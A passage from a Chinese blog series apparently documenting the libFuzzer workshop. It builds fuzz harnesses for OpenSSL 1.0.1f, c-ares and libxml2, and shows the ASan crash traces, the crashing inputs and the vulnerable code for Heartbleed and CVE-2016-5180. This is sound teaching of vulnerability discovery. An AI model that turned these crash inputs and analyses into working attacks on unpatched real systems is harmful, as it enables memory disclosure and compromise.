这里就涉及到openssl库提供的相关方法了，本篇主要讲解fuzz相关，就不细讲openssl了。总之就是要先搞清楚openssl的用法，再通过include openssl提供的函数来对openssl进行fuzz。编译如下： 123clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \\ -I openssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \\ ../../libFuzzer/Fuzz/libFuzzer.a -o openssl_fuzzer -I指定inlcude的搜索路径，同时链接静态库libcrypto.a和libFuzzer.a以使用库中的函数。 运行跑出crash: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#24646 REDUCE cov: 611 ft: 889 corp: 50/1105b lim: 116 exec/s: 24646 rss: 382Mb L: 64/77 MS: 5 InsertRepeatedBytes-PersAutoDict-InsertByte-ShuffleBytes-ChangeBit- DE: &quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x04&quot;-#25193 REDUCE cov: 611 ft: 889 corp: 50/1097b lim: 116 exec/s: 25193 rss: 382Mb L: 61/77 MS: 1 EraseBytes-===================================================================2133==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x00000051eaba bp 0x7ffd255dae50 sp 0x7ffd255da618READ of size 21050 at 0x629000009748 thread T0 #0 0x51eab9 in __asan_memcpy /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 #1 0x55e323 in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3 #2 0x5cb97d in ssl3_read_bytes /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_pkt.c:1092:4 #3 0x5cff83 in ssl3_get_message /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:457:7 #4 0x59ac86 in ssl3_get_client_hello /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:941:4 #5 0x596ac1 in ssl3_accept /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:357:9 #6 0x5518ad in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/05/openssl_fuzzer.cc:39:3 #7 0x459a01 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #8 0x459245 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #9 0x45b4e7 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #10 0x45c205 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #11 0x449fc8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #12 0x473432 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #13 0x7f40a3932bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #14 0x41e159 in _start (/home/admin/libfuzzer-workshop/lessons/05/openssl_fuzzer2+0x41e159)0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)allocated by thread T0 here: #0 0x51f67d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x60091b in CRYPTO_malloc /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/crypto/mem.c:308:8 #2 0x5d1737 in freelist_extract /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:708:12 #3 0x5d1737 in ssl3_setup_read_buffer /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:770:10 #4 0x5d1d4c in ssl3_setup_buffers /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_both.c:827:7 #5 0x597703 in ssl3_accept /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:292:9 #6 0x5518ad in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/05/openssl_fuzzer.cc:39:3 #7 0x459a01 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #8 0x45b8a5 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:740:3 #9 0x45be79 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:793:3 #10 0x449fc8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #11 0x473432 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #12 0x7f40a3932bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 in __asan_memcpyShadow bytes around the buggy address: 0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa 0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==2133==ABORTINGMS: 2 ChangeBinInt-InsertByte-; base unit: 7bfa057a7ae6a7bc6ea487749407e4e7d4e9bf840x15,0x3,0xd4,0x0,0x7,0x1,0x3a,0x1,0x3a,0x1,0xd3,0xb3,0x18,0x3,0xd4,0x0,0x7,0x1,0x52,0x3a,0x1,0x3a,0x9,0xd3,0xb3,0x18,0x2c,0x0,0x7,0x2,0x7,0x1,0x3a,0x1,0x0,\\x15\\x03\\xd4\\x00\\x07\\x01:\\x01:\\x01\\xd3\\xb3\\x18\\x03\\xd4\\x00\\x07\\x01R:\\x01:\\x09\\xd3\\xb3\\x18,\\x00\\x07\\x02\\x07\\x01:\\x01\\x00artifact_prefix='./'; Test unit written to ./crash-4bfb53055de3fed318590b20ddd4cda0d95e8ed8Base64: FQPUAAcBOgE6AdOzGAPUAAcBUjoBOgnTsxgsAAcCBwE6AQA= 通过SUMMARY容易找到造成heap_overflow的漏洞点在于:/local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 in __asan_memcpy这种目录一看就是很底层的目录，不易定位。再往找一层:#1 0x55e323 in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3这就很容易定位了，接下来就是漏洞溯源了。定位到了代码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667tls1_process_heartbeat(SSL *s) { unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0], *pl; unsigned short hbtype; unsigned int payload; unsigned int padding = 16; /* Use minimum padding */ /* Read type and payload length first */ hbtype = *p++; n2s(p, payload); pl = p; if (s-&gt;msg_callback) s-&gt;msg_callback(0, s-&gt;version, TLS1_RT_HEARTBEAT, &amp;s-&gt;s3-&gt;rrec.data[0], s-&gt;s3-&gt;rrec.length, s, s-&gt;msg_callback_arg); if (hbtype == TLS1_HB_REQUEST) { unsigned char *buffer, *bp; int r; /* Allocate memory for the response, size is 1 bytes * message type, plus 2 bytes payload length, plus * payload, plus padding */ buffer = OPENSSL_malloc(1 + 2 + payload + padding); bp = buffer; /* Enter response type, length and copy payload */ *bp++ = TLS1_HB_RESPONSE; s2n(payload, bp); memcpy(bp, pl, payload); //漏洞点 bp += payload; /* Random padding */ RAND_pseudo_bytes(bp, padding); r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); if (r &gt;= 0 &amp;&amp; s-&gt;msg_callback) s-&gt;msg_callback(1, s-&gt;version, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding, s, s-&gt;msg_callback_arg); OPENSSL_free(buffer); if (r &lt; 0) return r; } else if (hbtype == TLS1_HB_RESPONSE) { unsigned int seq; /* We only send sequence numbers (2 bytes unsigned int), * and 16 random bytes, so we just try to read the * sequence number */ n2s(pl, seq); if (payload == 18 &amp;&amp; seq == s-&gt;tlsext_hb_seq) { s-&gt;tlsext_hb_seq++; s-&gt;tlsext_hb_pending = 0; } } return 0; } 漏洞点再memcpy(bp, pl, payload);根据crash原因为over_flow说明payload的长度有问题。往上分析发现payload是通过n2s函数从p指向的结构体（用户数据包）内容得到的。该结构体为： 1234567891011typedef struct ssl3_record_st { int type; / type of record / unsigned int length; / How many bytes available / unsigned int off; / read/write offset into 'buf' / unsigned char data; / pointer to the record data / unsigned char input; / where the decode bytes are / unsigned char comp; / only used with decompression - malloc()ed / unsigned long epoch; / epoch number, needed by DTLS1 / unsigned char seq_num[8]; / sequence number, needed by DTLS1 / } SSL3_RECORD; 而程序并没有对用户可控的length做检查，从而导致memcpy溢出（有可能将server端的数据写入到返回数据包中返回给用户）。 初学libfuzzer，如有纰漏错误还烦请师傅们指正。 lesson06 gogogo!06给出的是CVE-2016-5180漏洞，该漏洞可以实现在ChromeOS下的远程代码执行，无疑是高危漏洞。PS：我觉得在学习libfuzzer的过程中，我们不能仅仅局限局限于获得了一个crash，还要进一步的去定位漏洞之所在，分析漏洞产生的原因，思考漏洞的利用方法和修补方式，这才是正确对待fuzz的态度以及漏洞挖掘的魅力所在。如同05所作的步骤，我们要先对开源库进行编译 如果我们单纯直接编译而不进行编译插桩的话: 12345tar xzvf c-ares.tgzcd c-ares./buildconf./configuremake 得到的fuzz效果为： 123456789101112131415➜ 06 git:(master) ✗ ./c_ares_fuzzer INFO: Seed: 2221841816INFO: Loaded 1 modules (14 inline 8-bit counters): 14 [0x7a7ef8, 0x7a7f06), INFO: Loaded 1 PC tables (14 PCs): 14 [0x5700b8,0x570198), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 4 ft: 5 corp: 1/1b exec/s: 0 rss: 27Mb#5 NEW cov: 5 ft: 6 corp: 2/3b lim: 4 exec/s: 0 rss: 27Mb L: 2/2 MS: 3 ShuffleBytes-ChangeByte-CopyPart-#1337 NEW cov: 8 ft: 9 corp: 3/20b lim: 17 exec/s: 0 rss: 27Mb L: 17/17 MS: 2 ShuffleBytes-CrossOver-#1357 REDUCE cov: 8 ft: 9 corp: 3/19b lim: 17 exec/s: 0 rss: 27Mb L: 16/16 MS: 5 CrossOver-EraseBytes-CopyPart-ChangeBinInt-InsertRepeatedBytes-#524288 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 262144 rss: 712Mb#1048576 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 262144 rss: 775Mb#2097152 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 262144 rss: 777Mb#4194304 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 246723 rss: 777Mb#8388608 pulse cov: 8 ft: 9 corp: 3/19b lim: 4096 exec/s: 220752 rss: 777Mb 出现如此boring的结果的原因再与缺少了编译时的选项设置，即没有在编译时进行插桩插桩操作：在其中特定的的位置插入汇编代码，实现在程序执行到该处时能够通过此处的插桩掌握程序的执行路径 12345tar xzvf c-ares.tgzcd c-ares./buildconf./configure CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;make CFLAGS= 这里的-fsanitize=address即开启ASAN(Address Sanitizer)，编译时则会在目标代码的关键位置添加检查代码，例如：malloc(),free()等，一旦发现了内存访问错误，便可以SIGABRT中止程序。（即完成了编译插桩）这里指定CC选项也是不规范的，提倡CC = &quot;clang&quot; &amp;&amp; CFLAGS = &quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;顺利编译生成.a静态链接库文件，接着是编写fuzzer接口函数。workshop提供给我们的harness如下: 12345678910111213141516171819// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/nameser.h&gt;#include &lt;string&gt;#include &lt;ares.h&gt;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { unsigned char *buf; int buflen; std::string s(reinterpret_cast&lt;const char *&gt;(data), size); ares_create_query(s.c_str(), ns_c_in, ns_t_a, 0x1234, 0, &amp;buf, &amp;buflen, 0); ares_free_string(buf); return 0;} 可以看到harness将输入的测试样本data类型转化为strings s，之后选择了ares_creat_query和ares_free_strings作为入口函数来进行fuzz。编译：clang++ -g c_ares_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer -Ic-ares c-ares/.libs/libcares.a运行后很快得到了crash说明提供的harness是很有效的，接口函数的选择合适。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576➜ 06 git:(master) ✗ ./c_ares_fuzzer INFO: Seed: 3003118136INFO: Loaded 1 modules (11 inline 8-bit counters): 11 [0x7f72c0, 0x7f72cb), INFO: Loaded 1 PC tables (11 PCs): 11 [0x5b7740,0x5b77f0), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 4 ft: 4 corp: 1/1b exec/s: 0 rss: 27Mb#10 NEW cov: 5 ft: 5 corp: 2/3b lim: 4 exec/s: 0 rss: 27Mb L: 2/2 MS: 3 ShuffleBytes-CrossOver-InsertByte-#1336 NEW cov: 7 ft: 7 corp: 3/20b lim: 17 exec/s: 0 rss: 27Mb L: 17/17 MS: 1 CrossOver-#1385 REDUCE cov: 7 ft: 7 corp: 3/19b lim: 17 exec/s: 0 rss: 27Mb L: 16/16 MS: 4 CopyPart-EraseBytes-InsertByte-CopyPart-===================================================================7322==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000f7b654 at pc 0x00000059bd4c bp 0x7fff83ba42b0 sp 0x7fff83ba42a8WRITE of size 1 at 0x603000f7b654 thread T0 #0 0x59bd4b in ares_create_query /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 #1 0x59b33c in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/06/c_ares_fuzzer.cc:16:3 #2 0x465fe6 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #3 0x46b649 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #4 0x46b649 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #5 0x46e66f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #6 0x4569f9 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #7 0x41f382 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #8 0x7f19eeaeabf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #9 0x41f3f9 in _start (/home/admin/libfuzzer-workshop/lessons/06/c_ares_fuzzer+0x41f3f9)0x603000f7b654 is located 0 bytes to the right of 20-byte region [0x603000f7b640,0x603000f7b654)allocated by thread T0 here: #0 0x552ef0 in malloc /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cpp:145 #1 0x59b826 in ares_create_query /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:133:10 #2 0x59b33c in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/06/c_ares_fuzzer.cc:16:3 #3 0x465fe6 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #4 0x46b649 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #5 0x46b649 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #6 0x46e66f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #7 0x4569f9 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #8 0x41f382 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #9 0x7f19eeaeabf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 in ares_create_queryShadow bytes around the buggy address: 0x0c06801e7670: fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa 0x0c06801e7680: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa 0x0c06801e7690: fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd 0x0c06801e76a0: fd fa fa fa fd fd fd fd fa fa fd fd fd fa fa fa 0x0c06801e76b0: fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fa=&gt;0x0c06801e76c0: fa fa fd fd fd fa fa fa 00 00[04]fa fa fa fa fa 0x0c06801e76d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e76e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e76f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e7700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06801e7710: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==7322==ABORTINGMS: 4 ChangeByte-ChangeBinInt-CopyPart-ChangeBit-; base unit: 900229d109e2354708da1b4fe903c1ef0e741ab80xdc,0x2e,0x5c,0x2e,\\xdc.\\\\.artifact_prefix='./'; Test unit written to ./crash-55bfecc1f01482c0ec080b0da9ab7f50cd9fa363Base64: 3C5cLg== SUMMARY中:SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 in ares_create_query，了解到漏洞正位于ares_create_query函数中。定位一下漏洞点： 1234//ares_create_query.c:196:3/* Finish off the question with the type and class. */DNS_QUESTION_SET_TYPE(q, type);DNS_QUESTION_SET_CLASS(q, dnsclass); //漏洞点，该处存在heap_overflow 但对于漏洞的具体产生方式进行溯源的话就要对代码进行审计，这里就不展开了。 到这里对libfuzzer的基本操作已经有了一个初步的认识，但fuzz的对象都是规模较小的开源库。当我们面对大规模的开源项目以及需要进行长时间的测试工作时，如何继续保持fuzz的高效进行以得到crash便是我们要继续研究的课题，这就涉及到一些对编译选项的设置以及对fuzz的一些额外条件的设定，这些都会可能会影响到fuzz的效率，等待这我们进一步的研究。","link":"/2020/12/17/LibFuzzer(1)/"},{"title":"（转）LibFuzzer workshop学习之路（二）","text":"文章首发于安全客，由安全客原创发布： https://www.anquanke.com/post/id/225957 LibFuzzer workshop学习之路（二） 上一篇对libfuzzer的原理和使用有了基本的了解，接下来就到进阶的内容了，会涉及到字典的使用，语料库精简，错误报告生成以及一些关键的编译选项的选择等内容，希望能对libfuzzer有更深入的学习。 lesson 08(dictionaries are so effective)对libxml2进行fuzz。首先对其解压并用clang编译之。 12345678tar xzf libxml2.tgzcd libxml2./autogen.shexport FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configuremake -j$(nproc) 解释下新的编译选项-gline-tables-only:表示使用采样分析器clang手册中对采样分析器的解释:Sampling profilers are used to collect runtime information, such as hardware counters, while your application executes. They are typically very efficient and do not incur a large runtime overhead. The sample data collected by the profiler can be used during compilation to determine what the most executed areas of the code are.用于收集程序执行期间的信息比如硬件计数器，在编译期间使用采样分析器所收集的数据来确定代码中最值得执行的区域。因此，使用样本分析器中的数据需要对程序的构建方式进行一些更改。在编译器可以使用分析信息之前，代码需要在分析器下执行。这也对提高我们fuzz效率很重要。提供的harness： 1234567891011121314151617181920212223// Copyright 2015 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &quot;libxml/parser.h&quot;void ignore (void* ctx, const char* msg, ...) { // Error handler to avoid spam of error messages from libxml parser.}extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) { xmlSetGenericErrorFunc(NULL, &amp;ignore); if (auto doc = xmlReadMemory(reinterpret_cast&lt;const char*&gt;(data), static_cast&lt;int&gt;(size), &quot;noname.xml&quot;, NULL, 0)) { xmlFreeDoc(doc); } return 0;} 将输入的样本类型转换后交给xmlReadMemory处理。编译如下：clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1 由于编译时使用了样本分析器，fuzz的执行速率和覆盖率都很可观 123456789101112131415161718192021222324252627#2481433 NEW cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 484/1470 MS: 1 CopyPart-#2481939 REDUCE cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 390/1470 MS: 4 InsertByte-ChangeBit-ShuffleBytes-EraseBytes-#2482177 REDUCE cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 816/1470 MS: 3 ChangeBit-ShuffleBytes-EraseBytes-#2482341 REDUCE cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 41/1470 MS: 2 CopyPart-EraseBytes-#2482513 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 604/1470 MS: 3 ChangeASCIIInt-ChangeASCIIInt-CopyPart-#2482756 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 342/1470 MS: 2 InsertRepeatedBytes-EraseBytes-#2483073 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 1188/1470 MS: 3 InsertByte-ShuffleBytes-EraseBytes-#2483808 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 102/1470 MS: 2 InsertRepeatedBytes-EraseBytes-#2483824 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 477/1470 MS: 1 EraseBytes-#2483875 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 70/1470 MS: 3 CopyPart-ChangeByte-EraseBytes-#2483999 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 604/1470 MS: 1 EraseBytes-#2485065 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 32/1470 MS: 1 EraseBytes-#2485100 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 139/1470 MS: 2 ChangeByte-EraseBytes-#2485127 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 622/1470 MS: 1 EraseBytes-#2485277 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 93/1470 MS: 1 EraseBytes-#2485465 REDUCE cov: 2019 ft: 9897 corp: 3525/671Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 40/1470 MS: 1 PersAutoDict- DE: &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05&quot;-#2485715 NEW cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 1092/1470 MS: 3 ChangeBit-CopyPart-CopyPart-#2485805 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 25/1470 MS: 2 ShuffleBytes-EraseBytes-#2486420 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 336/1470 MS: 2 InsertByte-EraseBytes-#2486677 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 33/1470 MS: 2 ChangeBit-EraseBytes-#2486836 REDUCE cov: 2019 ft: 9899 corp: 